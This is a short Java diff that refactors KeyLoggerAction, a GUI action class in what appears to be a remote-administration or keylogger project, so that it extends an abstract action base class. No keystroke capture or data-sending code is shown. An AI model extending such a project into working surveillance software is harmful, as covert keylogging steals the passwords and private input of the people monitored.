@@ -1,18 +1,20 @@
 package TableUtils.KeyLogger.Actions;
 
 import Server.Client;
+import Utilities.AbstractActionGUI;
+import Utilities.AbstractDialogCreator;
 import Utilities.GetSYS;
 import TableUtils.KeyLogger.Constants.KeyLog;
 import TableUtils.KeyLogger.Events.KeyloggerEvent;
 
 import java.awt.event.ActionEvent;
-import java.awt.event.ActionListener;
 
-public class KeyLoggerAction implements ActionListener {
+public class KeyLoggerAction extends AbstractActionGUI<AbstractDialogCreator> {
 
     private final KeyLog keyLog;
 
     public KeyLoggerAction(KeyLog keyLog) {
+        super(null);
         this.keyLog = keyLog;
     }
 
